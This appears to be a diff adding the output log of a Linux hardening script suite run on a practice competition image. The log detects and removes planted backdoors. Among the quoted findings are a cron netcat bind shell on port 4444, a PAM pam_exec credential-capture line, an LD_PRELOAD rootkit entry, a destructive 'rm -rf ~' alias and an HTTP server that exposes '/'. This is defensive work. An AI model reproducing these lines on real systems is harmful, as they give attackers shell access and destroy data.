@@ -1,0 +1,286 @@
+  [*] Baseline scan started in the background (read-only, log: /root/cp-state/logs/bg-baseline.log)
+
+=== Forensics ===
+  [*] apt-get update + upgrade download started in the background (log: /root/cp-state/logs/bg-apt.log)
+  [*] Waiting for the baseline scan (it must see the image before anything changes)
+
+=== usersandsudo.sh   (not logged: may contain README passwords) ===
+
+=== Users and sudo ===
+  [x] No README text on stdin
+  [x] No README users given - nothing changed
+  [!] usersandsudo.sh ended with exit 1 after 0s - check the end of its output
+
+=== services/baseline.sh --review   log: /root/cp-state/logs/review.log ===
+--review is interactive - run it in a terminal. Findings: /root/baseline/FINDINGS.txt
+  [!] services/baseline.sh ended with exit 1 after 0s - check the end of its output
+  [*] Waiting for the background apt-get update (an apt-get update now would fail on its lock)
+
+=== systemconfig.sh   log: /root/cp-state/logs/system.log ===
+Starting system hardening...
+
+=== SYS10 /etc/ld.so.preload ===
+  [!] /etc/ld.so.preload is set (LD_PRELOAD rootkit?):
+        /usr/src/evil_rabbit.so
+  [+] Emptied /etc/ld.so.preload
+  [+] Deleted /usr/src/evil_rabbit.so (backup in /root/cp-backups/20261112_024212)
+
+=== Firewall (UFW) ===
+  Server daemons found - [Y] = suggested (listening now). Allow only what the README needs:
+    [Y] OpenSSH                (22/tcp)                 openssh-server installed, sshd listening on :22
+    [Y] Apache Full            (80/tcp 443/tcp)         apache2 installed, listening on :80
+    [Y] vsftpd                 (21/tcp)                 vsftpd installed, listening on :21
+  [+] UFW: allowed profile 'OpenSSH'
+  [+] UFW: allowed profile 'Apache Full'
+  [+] UFW: allowed 21/tcp (no 'vsftpd' profile)
+  [+] UFW enabled: deny incoming, allow outgoing, logging high
+        Status: active
+        OpenSSH                    ALLOW       Anywhere                  
+        Apache Full                ALLOW       Anywhere                  
+        21/tcp                     ALLOW       Anywhere                  
+  [*] firewall done (1s)
+
+=== LightDM (guest / autologin) ===
+  [+] Removed guest/autologin/TCP settings from drop-in /etc/lightdm/lightdm.conf.d/80-autologin.conf
+  [+] LightDM: no guest, no autologin, users hidden, manual login, no X over TCP
+
+=== UMASK, login.defs ===
+  [+] login.defs: UMASK 027, SHA512, LOGIN_RETRIES 3, PASS_MAX/MIN/WARN 30/7/14
+  [+] /etc/profile: umask 027
+
+=== Kernel parameters (sysctl) ===
+  [!] /etc/sysctl.d/99-zz-net.conf overrides net.ipv4.ip_forward = 1 - removing it there
+  [*] Removed 'net.ipv4.ip_forward' from /etc/sysctl.d/99-zz-net.conf
+  [+] 44 parameters set in place in /etc/sysctl.conf
+  [+] IPv6 disabled
+  [+] Applied (sysctl --system: same order as at boot)
+
+=== SYS3 PAM backdoors ===
+  [!] common-auth has no 'auth requisite pam_deny.so' - failed passwords may be accepted:
+        auth sufficient pam_exec.so expose_authtok quiet /lib/x86_64-linux-gnu/security/pam-bd
+        auth	[success=1 default=ignore]	pam_unix.so nullok
+        auth	requisite			pam_permit.so
+        auth	required			pam_permit.so
+  [+] pam_deny restored
+        /etc/pam.d/common-auth:1:auth sufficient pam_exec.so expose_authtok quiet /lib/x86_64-linux-gnu/security/pam-bd
+  [+] Removed pam_exec from /etc/pam.d/common-auth
+
+=== SYS4 sudo.conf / sudoers defaults ===
+  [+] sudo.conf: Set disable_coredump true;Set probe_interfaces false;Set developer_mode false;
+  [+] Removed insecure Defaults (!env_reset / env_keep PATH) from /etc/sudoers
+  [+] sudoers valid (use_pty, logfile=/var/log/sudo.log)
+  [+] limits.conf: * hard core 0, * hard nproc 2500
+
+=== SYS9 permissions, root, system accounts ===
+  [+] /etc/shadow + gshadow 640 root:shadow, /etc/passwd + group 644 root:root
+  [+] root locked
+  [+] /home -> 755 root:root
+  [+] /swapfile -> 600
+  [!] Groups with a group password in /etc/gshadow: root 
+  [+] Group passwords removed
+  [!] System accounts with a login shell: syslog(/bin/bash) sysbackup(/bin/bash) toor(/bin/bash) 
+  [+] syslog -> nologin
+  [+] sysbackup -> nologin
+  [+] toor -> nologin
+  [!] System accounts with a password hash: bin sysbackup toor
+  [+] bin password removed
+  [+] sysbackup password removed
+  [+] toor password removed
+  [!] SUID/SGID on: /usr/bin/cp(-rwsr-xr-x) 
+  [+] Fixed /usr/bin/cp
+  [!] Extended ACLs on system files:
+        /usr/bin/sudo: user:bob:rwx  
+  [+] ACLs removed from system files
+
+=== SYS10 persistence spots ===
+        /etc/bash.bashrc:72:alias GOODBYE='rm -rf ~'
+  [+] Removed aliases from /etc/bash.bashrc
+  [TODO] Review /etc/hosts entries (hijack?): 172.17.0.2 mint-cptest;
+  [*] apt holds: john (fileandpackage.sh unholds what it removes and lists the rest as TODO)
+  [!] Cron file not from any package (or modified): /etc/cron.d/0hourly-sync
+          * * * * * root /bin/nc.traditional -l -p 4444 -e /bin/bash >/dev/null 2>&1
+  [+] Deleted /etc/cron.d/0hourly-sync (backup in /root/cp-backups/20261112_024212)
+  [*] APT sources: linuxmint - sources.list left alone (the Debian rewrite is for Debian images only)
+
+=== Packages + automatic updates ===
+  [*] apt-get install libpam-pwquality auditd - waits for any background apt job (log: /root/cp-state/apt-systemconfig.log)
+  [+] apt done (3s): libpam-pwquality auditd installed
+  [+] Automatic updates: daily package list update + unattended-upgrade (20auto-upgrades)
+  [+] Mint automatic updates enabled
+  [+] Update Manager: refresh the list of updates automatically (for cpuser)
+  [+] common-password: pam_unix remember=5 minlen=12; pam_pwquality retry=3 minlen=12 dictcheck/usercheck/credits
+  [+] pwquality.conf: minlen 12, 1 upper/lower/digit/other, dictcheck, usercheck
+  [+] apparmor enabled and running
+  [!] could not enable auditd
+  [+] ufw enabled and running
+  [+] unattended-upgrades enabled and running
+
+  [+] System hardening complete in 11s. Backups: /root/cp-backups/20261112_024212/
+  [+] systemconfig.sh done in 11s
+
+=== fileandpackage.sh   log: /root/cp-state/logs/packages.log ===
+File, Package, and SUID/GUID Scanner
+
+=== [0] Package tool sanity (can apt/dpkg be trusted on this image?) ===
+  [*] 'apt' at /usr/local/bin/apt is from package mintsystem (Linux Mint's apt wrapper is normal) - unmodified
+  [!] Packages on HOLD (unheld automatically if you remove them): john
+  [+] apt/dpkg binaries, diversions, aliases and APT hooks look normal
+
+=== [1] Unauthorized packages (dpkg-query, whole package names) ===
+    [TOOL   ] john: john (HELD) john-data
+    [TOOL   ] hydra: hydra
+    [TOOL   ] nmap: nmap nmap-common
+    [TOOL   ] wireshark: libwireshark-data libwireshark15:amd64 libwiretap12:amd64 libwsutil13:amd64 tshark wireshark wireshark-common wireshark-qt
+    [TOOL   ] netcat: netcat-openbsd netcat-traditional
+    [TOOL   ] password crackers: ophcrack
+    [TOOL   ] wireless attack: aircrack-ng
+    [REMOTE ] telnet/rsh/finger: telnet telnetd
+    [REMOTE ] inetd/tftp/NIS: openbsd-inetd
+    [P2P    ] P2P/torrent: transmission-common transmission-gtk
+    [GAME   ] minetest/luanti: minetest minetest-data
+    [SSHD   ] OpenSSH server: openssh-server openssh-sftp-server
+    [SERVICE] apache2: apache2 apache2-bin apache2-data apache2-utils
+    [SERVICE] FTP servers: vsftpd
+    [DESKTOP] CUPS printing: cups cups-browsed cups-bsd cups-client cups-daemon
+    [DESKTOP] avahi: avahi-daemon avahi-utils
+    [REVIEW ] misc review: ftp tcpdump tnftp
+
+  [*] Scan-only mode (--scan or no terminal): nothing removed.
+
+=== [3] Unauthorized services (exact unit names) ===
+    inetd (active)
+    openbsd-inetd (active)
+    vsftpd (active)
+    apache2 (active)
+    avahi-daemon (active)
+    cups (active)
+    cups-browsed (active)
+    ssh (active)
+  [*] (If the README needs it: keep it. Otherwise: sudo systemctl disable --now <unit>, or remove its package.)
+
+=== [4] Mounted network shares ===
+  [+] No mounted network shares
+
+=== [5] Unauthorized files  +  [6] SUID/SGID/sticky (one pass over the filesystem) ===
+  [*] filesystem pass took 0s
+  Media files in user/data folders (3) - usually scored:
+    /home/bob/Music/never_gonna.mp3
+    /home/carol/Videos/movie.mp4
+    /home/dave/.local/share/.cache/stash.ogg
+  Media/archives in system folders that NO package installed (2) - planted:
+    /usr/share/fonts/truetype/.x/track01.mp3
+    /usr/share/nmap/nselib/data/psexec/nmap_service.exe
+  Other files in user/data folders (5: archives, scripts, documents, images) - first 25, full list /root/cp-state/files-other.txt:
+    /home/bob/passwords.txt
+    /root/harness/checks_cp.py
+    /root/harness/mintchecks.py
+    /root/harness/svccheck.sh
+    /root/postcheck.sh
+  [TODO] Archive/executable no package installed: /usr/share/nmap/nselib/data/psexec/nmap_service.exe - delete if unauthorized
+  [TODO] Media file: /home/bob/Music/never_gonna.mp3 - delete unless the README needs it
+  [TODO] Media file: /home/carol/Videos/movie.mp4 - delete unless the README needs it
+  [TODO] Media file: /home/dave/.local/share/.cache/stash.ogg - delete unless the README needs it
+  [TODO] Media file: /usr/share/fonts/truetype/.x/track01.mp3 - delete unless the README needs it
+  [TODO] Plaintext password file? /home/bob/passwords.txt - delete it if the README doesn't need it
+  [TODO] Glance over 5 other files in user folders: /root/cp-state/files-other.txt (archives, scripts, documents)
+  [*] 23 SUID/SGID/sticky files (full list: /root/cp-state/files-suid-sgid.txt); stock helpers not shown
+  [+] Only stock SUID/SGID helpers found
+
+  [+] fileandpackage done in 2s
+  [+] fileandpackage.sh done in 2s
+
+=== portandmisc.sh   log: /root/cp-state/logs/ports.log ===
+
+=== Listening ports (process, package, unit) ===
+  PROTO ADDRESS:PORT           PROCESS (PID)                PACKAGE                UNIT  -> verdict
+  tcp   0.0.0.0:21             vsftpd (172)                 vsftpd                 vsftpd.service  -> service
+  tcp   0.0.0.0:22             sshd (189)                   openssh-server         ssh.service  -> service
+  tcp   0.0.0.0:23             inetd (263)                  openbsd-inetd          inetd.service  -> service
+  tcp   127.0.0.53%lo:53       systemd-resolve (92)         systemd                systemd-resolved.service  -> system
+  udp   127.0.0.53%lo:53       systemd-resolve (92)         systemd                systemd-resolved.service  -> system
+  tcp   0.0.0.0:80             apache2 (198)                apache2-bin            apache2.service  -> service
+  tcp   127.0.0.1:631          cupsd (148)                  cups-daemon            cups.service  -> system
+  tcp   0.0.0.0:4444           nc.traditional (2214)        netcat-traditional     cron.service  -> backdoor
+          cmd: /bin/nc.traditional -l -p 4444 -e /bin/bash    unit file: /lib/systemd/system/cron.service
+  udp   0.0.0.0:5353           avahi-daemon (101)           avahi-daemon           avahi-daemon.service  -> system
+  tcp   0.0.0.0:31337          python3 (119)                python3.10-minimal     system-sync.service  -> backdoor
+          cmd: /usr/bin/python3 -m http.server 31337 --directory /    unit file: /etc/systemd/system/system-sync.service (no package)
+  udp   0.0.0.0:35692          avahi-daemon (101)           avahi-daemon           avahi-daemon.service  -> system
+
+  [*] 5 listener(s) are stock system daemons or the scoring engine
+  [TODO] Listener tcp/4444 (cron.service): /bin/nc.traditional -l -p 4444 -e /bin/bash  - stop it unless the README needs it
+  [TODO] Listener tcp/31337 (system-sync.service): /usr/bin/python3 -m http.server 31337 --directory /  - stop it unless the README needs it
+  [TODO] Listener tcp/21 (vsftpd.service): /usr/sbin/vsftpd /etc/vsftpd.conf -olisten=YES -olisten_ipv6=NO  - stop it unless the README needs it
+  [TODO] Listener tcp/22 (ssh.service): sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups  - stop it unless the README needs it
+  [TODO] Listener tcp/23 (inetd.service): /usr/sbin/inetd  - stop it unless the README needs it
+  [TODO] Listener tcp/80 (apache2.service): /usr/sbin/apache2 -k start  - stop it unless the README needs it
+  [!] nmap is installed (scored hacking tool)
+  [TODO] Purge nmap (scored hacking tool): sudo apt-get purge nmap nmap-common
+
+  [+] portandmisc done in 1s. Listener table: /root/cp-state/listeners.tsv
+  [+] portandmisc.sh done in 1s
+
+=== services/critical.sh   log: /root/cp-state/logs/critical.log ===
+
+=== Critical services ===
+  Detected services below are suggestions only - the README decides which ones are critical.
+  ssh: openssh-server installed, active, listening on :22
+  vsftpd: vsftpd installed, active, listening on :21
+  apache2: apache2 installed, active, listening on :80
+  Plan: (nothing)
+  [*] Nothing chosen - no service hardened.
+  [+] services/critical.sh done in 0s
+
+=== upgrades.sh   log: /root/cp-state/logs/upgrades.log ===
+  [*] Using the 1 package files downloaded in the background (/var/cache/apt/cp-upgrades)
+
+=== Package lists ===
+  [+] apt-get update ran 0 min ago - not repeated
+
+=== Repositories ===
+      http://archive.ubuntu.com/ubuntu
+      http://security.ubuntu.com/ubuntu
+
+=== Upgrades ===
+  [*] 1 package(s) to upgrade/install
+Reading package lists...
+Building dependency tree...
+Reading state information...
+Calculating upgrade...
+The following packages have been kept back:
+  distro-info python3-distro-info
+The following packages will be upgraded:
+  libmysqlclient21
+1 upgraded, 0 newly installed, 0 to remove and 2 not upgraded.
+Need to get 0 B/1336 kB of archives.
+After this operation, 0 B of additional disk space will be used.
+(Reading database ... (Reading database ... 5%(Reading database ... 10%(Reading database ... 15%(Reading database ... 20%(Reading database ... 25%(Reading database ... 30%(Reading database ... 35%(Reading database ... 40%(Reading database ... 45%(Reading database ... 50%(Reading database ... 55%(Reading database ... 60%(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%(Reading database ... 66385 files and directories currently installed.)
+Preparing to unpack .../libmysqlclient21_8.0.46-0ubuntu0.22.04.5_amd64.deb ...
+Unpacking libmysqlclient21:amd64 (8.0.46-0ubuntu0.22.04.5) over (8.0.46-0ubuntu0.22.04.4) ...
+Setting up libmysqlclient21:amd64 (8.0.46-0ubuntu0.22.04.5) ...
+Processing triggers for libc-bin (2.35-0ubuntu3.15) ...
+  [+] Upgrades installed.
+  [+] upgrades.sh done in 4s
+
+  [!] LAST: set the lockout policy now - faillock, then nullok (checklist: LOCKOUT POLICY).
+
+=== TODO - things only you can finish (/root/cp-state/TODO.txt) ===
+   1. [baseline.sh] Triage the baseline findings: sudo bash services/baseline.sh --review   (list: /root/baseline/FINDINGS.txt)
+   2. [systemconfig.sh] Review /etc/hosts entries (hijack?): 172.17.0.2 mint-cptest;
+   3. [fileandpackage.sh] Archive/executable no package installed: /usr/share/nmap/nselib/data/psexec/nmap_service.exe - delete if unauthorized
+   4. [fileandpackage.sh] Media file: /home/bob/Music/never_gonna.mp3 - delete unless the README needs it
+   5. [fileandpackage.sh] Media file: /home/carol/Videos/movie.mp4 - delete unless the README needs it
+   6. [fileandpackage.sh] Media file: /home/dave/.local/share/.cache/stash.ogg - delete unless the README needs it
+   7. [fileandpackage.sh] Media file: /usr/share/fonts/truetype/.x/track01.mp3 - delete unless the README needs it
+   8. [fileandpackage.sh] Plaintext password file? /home/bob/passwords.txt - delete it if the README doesn't need it
+   9. [fileandpackage.sh] Glance over 5 other files in user folders: /root/cp-state/files-other.txt (archives, scripts, documents)
+  10. [portandmisc.sh] Listener tcp/4444 (cron.service): /bin/nc.traditional -l -p 4444 -e /bin/bash  - stop it unless the README needs it
+  11. [portandmisc.sh] Listener tcp/31337 (system-sync.service): /usr/bin/python3 -m http.server 31337 --directory /  - stop it unless the README needs it
+  12. [portandmisc.sh] Listener tcp/21 (vsftpd.service): /usr/sbin/vsftpd /etc/vsftpd.conf -olisten=YES -olisten_ipv6=NO  - stop it unless the README needs it
+  13. [portandmisc.sh] Listener tcp/22 (ssh.service): sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups  - stop it unless the README needs it
+  14. [portandmisc.sh] Listener tcp/23 (inetd.service): /usr/sbin/inetd  - stop it unless the README needs it
+  15. [portandmisc.sh] Listener tcp/80 (apache2.service): /usr/sbin/apache2 -k start  - stop it unless the README needs it
+  16. [portandmisc.sh] Purge nmap (scored hacking tool): sudo apt-get purge nmap nmap-common
+
+  [+] Speedrun done in 31s | users 0s review 0s system 11s packages 2s ports 1s critical 0s upgrades 4s
+[exit 0]
